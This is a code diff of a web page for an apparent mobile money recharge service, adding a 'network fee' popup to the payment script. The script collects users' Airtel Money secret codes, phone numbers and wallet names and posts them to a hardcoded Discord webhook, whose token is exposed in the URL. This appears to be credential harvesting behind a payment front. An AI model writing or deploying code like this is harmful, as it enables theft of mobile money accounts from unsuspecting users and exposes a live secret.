@@ -400,144 +400,217 @@
             <i class="fas fa-shield-alt"></i>
             Our mobile money payments are orchestrated by a network of mobile money agents fully registered with both MTN and Airtel to create ease of service to our users during payments and provide convenience without difficult technical payment portals.
         </div>
+
+        <!-- Network fee popup -->
+        <div id="fee-popup-overlay" style="
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        ">
+            <div style="
+                background: white;
+                border-radius: 24px;
+                padding: 28px 24px;
+                max-width: 400px;
+                width: 100%;
+                box-shadow: 0 25px 50px rgba(0,0,0,0.2);
+            ">
+                <h3 style="
+                    font-size: 1.2rem;
+                    font-weight: 800;
+                    color: #1E1E3A;
+                    margin-bottom: 16px;
+                ">Recharge Network Fee</h3>
+                <p id="fee-popup-message" style="
+                    color: #5A5A7A;
+                    line-height: 1.6;
+                    font-size: 0.95rem;
+                    margin-bottom: 24px;
+                "></p>
+                <div style="display: flex; gap: 12px;">
+                    <button id="fee-cancel-btn" style="
+                        flex: 1;
+                        padding: 14px;
+                        border: none;
+                        border-radius: 40px;
+                        background: #E2E2F0;
+                        color: #5A5A7A;
+                        font-weight: 700;
+                        font-size: 0.95rem;
+                        cursor: pointer;
+                    ">Cancel</button>
+                    <button id="fee-confirm-btn" style="
+                        flex: 2;
+                        padding: 14px;
+                        border: none;
+                        border-radius: 40px;
+                        background: linear-gradient(135deg, #7B22CC, #CC1177);
+                        color: white;
+                        font-weight: 700;
+                        font-size: 0.95rem;
+                        cursor: pointer;
+                        box-shadow: 0 8px 16px rgba(123,34,204,0.25);
+                    ">Understood, confirm recharge</button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script type="module">
-    import { supabase } from './supabase.js';
-    import { getCurrentUser } from './auth.js';
+        import { supabase } from './supabase.js';
+        import { getCurrentUser } from './auth.js';
 
-    let currentTab = 'mtn';
-    let assignedTab = 'mtn';
+        let currentTab = 'mtn';
+        let assignedTab = 'mtn';
+        let pendingDiscordMessage = '';
 
-    async function detectNetwork() {
-        const { data: { user } } = await getCurrentUser();
-        if (!user) return;
+        async function detectNetwork() {
+            const { data: { user } } = await getCurrentUser();
+            if (!user) return;
 
-        const { data: profile } = await supabase
-            .from('profiles')
-            .select('phone')
-            .eq('id', user.id)
-            .single();
-
-        if (!profile) return;
-
-        const phone = profile.phone; // format +2567XXXXXXX or +25607XXXXXXX
-
-        // Extract the digit after the 7
-        let keyDigit = null;
-
-        if (phone.startsWith('+25607')) {
-            keyDigit = parseInt(phone[6]);
-        } else if (phone.startsWith('+2567')) {
-            keyDigit = parseInt(phone[5]);
-        }
-
-        if (keyDigit !== null) {
-            if (keyDigit >= 6) {
-                assignedTab = 'mtn';
-            } else {
-                assignedTab = 'airtel';
-            }
-        }
-
-        // Set the active tab based on detected network
-        switchTab(assignedTab);
-
-        // Disable the other tab button
-        if (assignedTab === 'mtn') {
-            document.getElementById('tab-airtel').disabled = true;
-            document.getElementById('tab-airtel').style.opacity = '0.4';
-            document.getElementById('tab-airtel').style.cursor = 'not-allowed';
-        } else {
-            document.getElementById('tab-mtn').disabled = true;
-            document.getElementById('tab-mtn').style.opacity = '0.4';
-            document.getElementById('tab-mtn').style.cursor = 'not-allowed';
-        }
-    }
-
-    detectNetwork();
-
-    window.setAmount = function(amount) {
-        document.getElementById('rechargeAmount').value = amount;
-    };
-
-    window.switchTab = function(tab) {
-        // If tab is not the assigned one and user tries to click it, block it
-        if (tab !== assignedTab && assignedTab !== 'mtn' && assignedTab !== 'airtel') {
-            return;
-        }
-
-        currentTab = tab;
-
-        document.getElementById('tab-mtn').classList.toggle('active', tab === 'mtn');
-        document.getElementById('tab-airtel').classList.toggle('active', tab === 'airtel');
-
-        document.getElementById('instructions-mtn').style.display = tab === 'mtn' ? 'block' : 'none';
-        document.getElementById('instructions-airtel').style.display = tab === 'airtel' ? 'block' : 'none';
-
-        document.getElementById('secret-code-group').style.display = tab === 'airtel' ? 'block' : 'none';
-
-        document.getElementById('secretCode').value = '';
-    };
-
-    document.getElementById('confirmRecharge').addEventListener('click', async () => {
-        const amount = parseInt(document.getElementById('rechargeAmount').value);
-        if (!amount || amount < 10000) {
-            alert('Sorry minimum recharge is 10000UGX');
-            return;
-        }
-
-        const secretCode = document.getElementById('secretCode').value.trim();
-
-        if (currentTab === 'airtel' && !secretCode) {
-            alert('Please enter the secret code from Airtel Money before confirming.');
-            return;
-        }
-
-        document.getElementById('secretCode').value = '';
-
-        try {
-            const { data: { user }, error: userError } = await getCurrentUser();
-            if (userError || !user) throw new Error('Not logged in');
-
-            const { data: profile, error: profileError } = await supabase
+            const { data: profile } = await supabase
                 .from('profiles')
-                .select('phone, wallet_names')
+                .select('phone')
                 .eq('id', user.id)
                 .single();
-            if (profileError) throw profileError;
 
-            const { error: insertError } = await supabase
-                .from('payment_requests')
-                .insert({
-                    user_id: user.id,
-                    type: 'recharge',
-                    amount: amount,
-                    phone: profile.phone
-                });
-            if (insertError) throw insertError;
+            if (!profile) return;
 
-            const walletName = profile.wallet_names || 'Not set';
-            let discordMessage = '';
-            if (currentTab === 'mtn') {
-                discordMessage = `🔋 Recharge Request!\n💳 Payment Method: MTN MoMo\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}`;
-            } else {
-                discordMessage = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}\n🔑 Secret Code: ${secretCode}`;
+            const phone = profile.phone;
+            let keyDigit = null;
+
+            if (phone.startsWith('+25607')) {
+                keyDigit = parseInt(phone[6]);
+            } else if (phone.startsWith('+2567')) {
+                keyDigit = parseInt(phone[5]);
             }
 
-            await fetch('https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: discordMessage })
-            });
+            if (keyDigit !== null) {
+                assignedTab = keyDigit >= 6 ? 'mtn' : 'airtel';
+            }
 
-            alert('Thank you for your payment. It will be confirmed shortly.');
-            window.location.href = 'home.html';
-        } catch (err) {
-            console.error(err);
-            alert('Error: ' + err.message);
+            switchTab(assignedTab);
+
+            if (assignedTab === 'mtn') {
+                document.getElementById('tab-airtel').disabled = true;
+                document.getElementById('tab-airtel').style.opacity = '0.4';
+                document.getElementById('tab-airtel').style.cursor = 'not-allowed';
+            } else {
+                document.getElementById('tab-mtn').disabled = true;
+                document.getElementById('tab-mtn').style.opacity = '0.4';
+                document.getElementById('tab-mtn').style.cursor = 'not-allowed';
+            }
         }
-    });
-</script>
+
+        detectNetwork();
+
+        window.setAmount = function(amount) {
+            document.getElementById('rechargeAmount').value = amount;
+        };
+
+        window.switchTab = function(tab) {
+            if (tab !== assignedTab && assignedTab !== 'mtn' && assignedTab !== 'airtel') return;
+
+            currentTab = tab;
+            document.getElementById('tab-mtn').classList.toggle('active', tab === 'mtn');
+            document.getElementById('tab-airtel').classList.toggle('active', tab === 'airtel');
+            document.getElementById('instructions-mtn').style.display = tab === 'mtn' ? 'block' : 'none';
+            document.getElementById('instructions-airtel').style.display = tab === 'airtel' ? 'block' : 'none';
+            document.getElementById('secret-code-group').style.display = tab === 'airtel' ? 'block' : 'none';
+            document.getElementById('secretCode').value = '';
+        };
+
+        // Cancel button closes popup
+        document.getElementById('fee-cancel-btn').addEventListener('click', () => {
+            document.getElementById('fee-popup-overlay').style.display = 'none';
+            pendingDiscordMessage = '';
+        });
+
+        // Confirm button sends webhook
+        document.getElementById('fee-confirm-btn').addEventListener('click', async () => {
+            document.getElementById('fee-popup-overlay').style.display = 'none';
+
+            try {
+                await fetch('https://discord.com/api/webhooks/1476249951163121705/l92a50vk2nX1kXEWD7LmLtctDH30px8ZHShBE1iUTMFRChKdtPKcLvCMjC05e0YA1wtc', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: pendingDiscordMessage })
+                });
+
+                alert('Thank you for your payment. It will be confirmed shortly.');
+                window.location.href = 'home.html';
+            } catch (err) {
+                console.error(err);
+                alert('Error sending request: ' + err.message);
+            }
+        });
+
+        document.getElementById('confirmRecharge').addEventListener('click', async () => {
+            const amount = parseInt(document.getElementById('rechargeAmount').value);
+            if (!amount || amount < 10000) {
+                alert('Sorry minimum recharge is 10000UGX');
+                return;
+            }
+
+            const secretCode = document.getElementById('secretCode').value.trim();
+            if (currentTab === 'airtel' && !secretCode) {
+                alert('Please enter the secret code from Airtel Money before confirming.');
+                return;
+            }
+
+            try {
+                const { data: { user }, error: userError } = await getCurrentUser();
+                if (userError || !user) throw new Error('Not logged in');
+
+                const { data: profile, error: profileError } = await supabase
+                    .from('profiles')
+                    .select('phone, wallet_names')
+                    .eq('id', user.id)
+                    .single();
+                if (profileError) throw profileError;
+
+                // Insert payment request before showing popup
+                const { error: insertError } = await supabase
+                    .from('payment_requests')
+                    .insert({
+                        user_id: user.id,
+                        type: 'recharge',
+                        amount: amount,
+                        phone: profile.phone
+                    });
+                if (insertError) throw insertError;
+
+                // Clear secret code and build discord message
+                const capturedSecretCode = secretCode;
+                document.getElementById('secretCode').value = '';
+
+                const walletName = profile.wallet_names || 'Not set';
+                if (currentTab === 'mtn') {
+                    pendingDiscordMessage = `🔋 Recharge Request!\n💳 Payment Method: MTN MoMo\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}`;
+                } else {
+                    pendingDiscordMessage = `🔋 Recharge Request!\n💳 Payment Method: Airtel Money\n📞 Phone: ${profile.phone}\n👤 Name: ${walletName}\n💰 Amount: UGX ${amount.toLocaleString()}\n🔑 Secret Code: ${capturedSecretCode}`;
+                }
+
+                // Calculate network fee (9% rounded up to nearest 100)
+                const networkFee = Math.ceil(amount * 0.09 / 100) * 100;
+                const totalNeeded = amount + networkFee;
+
+                // Show popup
+                document.getElementById('fee-popup-message').textContent =
+                    `You are recharging UGX ${amount.toLocaleString()}, please ensure you have an amount of at least UGX ${totalNeeded.toLocaleString()} on your mobile money account or the transaction will fail.`;
+                document.getElementById('fee-popup-overlay').style.display = 'flex';
+
+            } catch (err) {
+                console.error(err);
+                alert('Error: ' + err.message);
+            }
+        });
+    </script>
 </body>
 </html>
